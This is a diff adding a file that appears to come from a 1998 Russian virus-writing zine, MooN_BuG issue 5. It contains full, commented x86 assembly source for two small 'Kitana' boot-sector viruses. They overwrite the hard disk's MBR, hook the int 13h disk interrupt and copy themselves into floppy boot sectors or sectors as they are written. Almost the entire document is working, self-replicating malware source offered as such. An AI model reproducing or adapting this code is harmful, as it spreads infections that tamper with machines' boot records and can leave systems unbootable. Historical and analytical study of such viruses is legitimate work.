@@ -1,0 +1,201 @@
+[TulaAnti&ViralClub] PRESENTS ...
+MooN_BuG, Issue 5, May 1998                                           file 00a
+
+                                Вирусы Kitana
+                                                              by FRiZER
+
+┌─[BeginNFO]─────────────────────────────────────────────────────────────────┐
+■ Name    : Kitana                                                           │
+■ Made by : FRiZER                                                           │
+■ Made at : 12.03.98                                                         │
+■ Size    : 101 bytes                                                        │
+■ Target  : BOOT дискеты при его записи                                      │
+│         : MBR при загрузке с инфицированной дискеты                        │
+└─[EndNFO]───────────────────────────────────────────────────────────────────┘
+
+;этот вирус имеет длинну кода 99 байт если не считать EB??, который
+;тоже переписывается вместе с телом вируса, но в отличие от предыдущего
+;он не портит Partition Table и заражает BOOT дискеты вместо COM-файла.
+
+;[Kitana.101]
+.model tiny
+.386
+.code
+.startup
+org  100h
+ofs  equ offset
+vs   equ e-s    ; vs - virus size
+ls   equ i-s    ; ls - loader size
+; [MBR] ES:BX = CS:IP = 0000:7C00; DX = 0000; CX = 00??; SI = 00??; DI = 7C??
+jmp  $+ls
+s:
+xor  ax,ax
+mov  ds,ax      ;ds=0
+mov  al,ls      ;ax=loader size
+mov  es,ax
+xor  di,di      ;di=0
+mov  si,bx      ;si=7c00
+mov  cl,vs      ;cx=virus size
+movsw           ;первые два байта (jmp $+3Eh)
+add  si,ax      ;si - ofs virus body
+rep  movsb
+xchg ax,[di-(vs+2)+13h*4]
+stosw
+mov  ax,es
+xchg ax,[di-(vs+2)+13h*4]
+stosw
+
+x:
+mov  ax,0201h
+mov  dl,80h     ;dx=0080
+mov  es,cx      ;es=0
+mov  cl,al      ;cx=0001
+int  13h        ;read 0/0/1
+cmp  byte ptr [bx],0EBh ; первый байт - jmp $+3Eh
+je   a
+inc  ah         ;ax=0301
+inc  cx         ;cx=0002
+int  13h        ;write 0/0/2
+push ax
+xor  ax,ax
+call m          ;es:bx - куда писать
+pop  ax
+inc  cx         ;cx=0001
+int  13h
+jmp  x
+
+a:
+inc  cx         ;cx=0002
+int  13h        ;read 0/0/2
+jmp  bx         ;jmp 0:7c00
+
+
+i:
+push ds
+pusha
+mov  al,es:[bx]
+sub  ax,03EBh
+jnz  w
+push ofs w-100h
+m:
+mov  al,ls
+xor  si,si      ;si=0
+mov  di,bx      ;di=7c00
+mov  cx,ax
+mov  ds,ax      ;ds - seg of virus
+movsw           ;move "jmp" from (0) to (7c00)
+add  di,ax      ;di - ofs virus body
+rep  movsb
+ret
+w:
+popa
+pop  ds
+db 0EAh
+e:
+end
+
+;============================================================================
+
+┌─[BeginNFO]─────────────────────────────────────────────────────────────────┐
+■ Name    : Kitana                                                           │
+■ Made by : FRiZER                                                           │
+■ Made at : 09.03.98                                                         │
+■ Size    : 99 bytes                                                         │
+■ Target  : записываемые на дискету сектора начинающиеся с 0E9h              │
+│         : MBR при запуске зараженного файла                                │
+└─[EndNFO]───────────────────────────────────────────────────────────────────┘
+
+;[Kitana.??]
+.model tiny
+.386
+.code
+.startup
+vs    equ e-s
+org   100h
+; необходимые значения регистров при старте
+; из COM : AX=0000; SI=0100; CH=00
+; из MBR : BX=7C00; SI=00??; CH=00; DX=0000
+s:
+test  dx,dx             ; DX=0 при старте из MBR
+jz    if_mbr
+
+call  x                 ; AX=0201; DX=0080; CX=0001
+mov   bx,ax             ; буфер для чтения/записи
+int   13h
+
+cmp   [bx],byte ptr 85h ; проверка MBR на зараженность
+je    _ret
+
+inc   ah                ; AX=0301
+inc   cx                ; CX=0002 запись бывшего MBR в 0/0/2
+x10:
+int   13h
+xchg  si,bx             ; после loop: CX=0001; BX=начало вируса =>
+loop  x10               ; записываем в 0/0/1 тело вируса
+
+_ret:
+ret
+
+if_mbr:
+pushf                   ; ─┐
+push  bx                ; ─┼─ для iret'a в обработчике int13h
+push  cs                ; ─┘
+push  cs
+pop   ds                ; DS=CS
+mov   si,bx             ; SI=BX=7C00
+dec   word ptr ds:[413h]; уменьшим кол-во доступной памяти на 1Kb
+int   12h               ; получим в ax кол-во доступной памяти в Kb
+mov   cl,102            ; длина вируса (99 bytes) + 3 bytes
+rol   ax,cl             ; получаем в ax новый сегмент для тела вируса
+                        ; ROL AX,54 = SHL AX,6 (AX=AX*64)
+mov   es,ax
+xor   di,di             ; DI=0 - смещение, по которому будет лежать
+                        ; тело вируса в новом сегменте
+rep   movsb             ; задвигаем 54 words из ds:[si] в es:[di]
+
+                        ; перехват int13h:
+inc   cx
+inc   cx                ; CX=0002
+std                     ; DirectionFlag=1 => после STOSW будет DI=DI-2
+scasb                   ; DI=DI-1
+x20:                    ; цикл выполняется два раза - в первый раз
+xchg  ax,[di-(vs-4Ch)]  ; устанавливается segment int13h в таблице векторов
+                        ; на вирусный обработчик, а в конце вируса
+stosw                   ; получается JMP FAR xxxx:????
+mov   ax,new13h-s       ; во второй раз то же самое с offset'ом, т.е
+loop  x20               ; в конце вируса получается JMP FAR xxxx:zzzz
+                        ; xxxx - segment int13h, zzzz - offset int13h
+push  x-s
+z:
+mov   ax,0201h
+mov   dl,80h
+mov   cl,al
+ret
+x:
+inc   cx                ; CX=0002
+inc   di                ; DI - указывает на JMP FAR xxxx:xxxx
+push  di                ; для передачи управления
+push  es                ; телу вируса в новом сегменте
+retf                    ; jmp es:e-1
+                        ; там прочитается 0/0/1 в 0:7C00 и управление
+                        ; вернется в начало оригинального MBR
+
+new13h:                 ; обработчик int13h
+push  ds
+pusha
+mov   al,es:[bx]        ; AX=xxzz; Если xx=03 (функция записи)
+sub   ax,3E9h           ; а zz=E9h => записывается сектор с JMP в начале
+jnz   exit13h           ; нет -> jmp exit13h; да => ax=0000
+xchg  ax,si             ; si=0000
+xchg  bx,di             ; di=куда записывать тело вируса (в буфер)
+push  cs
+pop   ds                ; установим ds на сегмент тела вируса
+
+mov   ch,1              ; CX=01?? > чем длина вируса
+rep   movsb             ; задвигаем
+exit13h:
+popa                    ; восстанавливаем все регистры
+pop   ds                ; восстановим ds
+db    0EAh              ; jmp xxxx:xxxx
+e:
+end
